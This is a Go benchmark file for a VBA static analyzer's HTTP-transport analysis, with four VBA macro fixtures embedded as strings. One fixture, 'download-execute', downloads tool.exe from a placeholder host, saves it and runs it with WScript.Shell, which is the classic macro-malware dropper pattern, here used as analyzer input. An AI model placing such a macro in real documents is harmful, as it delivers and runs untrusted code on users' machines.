package analyze

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/harumiWeb/xlflow/internal/config"
	vbaast "github.com/harumiWeb/xlflow/internal/vba/ast"
	vbacfg "github.com/harumiWeb/xlflow/internal/vba/cfg"
	"github.com/harumiWeb/xlflow/internal/vba/procedureir"
)

// BenchmarkHTTPAnalysisKernel keeps HTTP-only allocation measurements small
// enough to run repeatedly while still exercising the fixed-point shapes that
// previously amplified cloneHTTPState and joinHTTPState.
func BenchmarkHTTPAnalysisKernel(b *testing.B) {
	fixtures := []struct {
		name   string
		source string
	}{
		{name: "linear", source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.Open "GET", "https://example.test", False
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Send
End Sub
`},
		{name: "branch-loop-alias", source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal configure As Boolean)
    Dim request As Object
    Dim aliasRequest As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set aliasRequest = request
    If configure Then
        aliasRequest.SetTimeouts 1000, 1000, 1000, 1000
    End If
    Do While configure
        request.Open "GET", "https://example.test", False
        request.Send
        Exit Do
    Loop
End Sub
`},
		{name: "wide-constants", source: `Attribute VB_Name = "Main"
Option Explicit
Private Const BaseURL As String = "https://example.test/"
Private Const PathPart As String = "resource"
Public Sub Run()
    Dim request As Object
    Dim target As String
    target = BaseURL & PathPart
    Set request = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    request.Open "GET", target, False
    request.Send
End Sub
`},
		{name: "download-execute", source: `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Dim stream As Object
    Dim shell As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set stream = CreateObject("ADODB.Stream")
    Set shell = CreateObject("WScript.Shell")
    request.Open "GET", "https://example.test/tool.exe", False
    request.Send
    stream.Write request.ResponseBody
    stream.SaveToFile "tool.exe", 2
    shell.Run "tool.exe"
End Sub
`},
	}
	for _, fixture := range fixtures {
		fixture := fixture
		b.Run(fixture.name, func(b *testing.B) {
			root := b.TempDir()
			moduleDir := filepath.Join(root, "src", "modules")
			if err := os.MkdirAll(moduleDir, 0o755); err != nil {
				b.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(moduleDir, "Main.bas"), []byte(fixture.source), 0o644); err != nil {
				b.Fatal(err)
			}
			file, proc := loadHTTPBenchmarkProcedure(b, root, fixture.source)
			cfg := config.Default()
			analyzer := Analyzer{RootDir: root, Config: cfg}
			b.ReportAllocs()
			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				if _, err := analyzer.httpTransportFindingsContext(context.Background(), file, proc); err != nil {
					b.Fatalf("HTTP fixture %s: %v", fixture.name, err)
				}
			}
		})
	}
}

func loadHTTPBenchmarkProcedure(b *testing.B, root, source string) (parsedFile, sourceProcedure) {
	b.Helper()
	path := filepath.Join(root, "src", "modules", "Main.bas")
	doc, err := vbaast.ParseDocument(path, []byte(source))
	if err != nil {
		b.Fatal(err)
	}
	defer doc.Close()
	ir, err := procedureir.BuildParsed(procedureir.BuildOptions{RootDir: root, Path: path, ModuleKind: "standard"}, doc)
	if err != nil {
		b.Fatal(err)
	}
	flow := vbacfg.BuildDocument(ir)
	procedures := sourceProceduresFromIRRef(&ir, flow)
	file := parsedFile{Path: path, Module: ir.ModuleName, ModuleKind: "standard", Source: []byte(source), Lines: normalizedSourceLines(source), IR: ir, CFG: flow, Procedures: procedures}
	file.ModuleFacts = buildModuleAnalysisFacts(file.Lines, file.IR, file.Procedures)
	for index := range file.Procedures {
		file.Procedures[index].ModuleFacts = file.ModuleFacts
	}
	for _, proc := range file.Procedures {
		if proc.Name == "Run" {
			return file, proc
		}
	}
	b.Fatal("Run procedure not found")
	return parsedFile{}, sourceProcedure{}
}
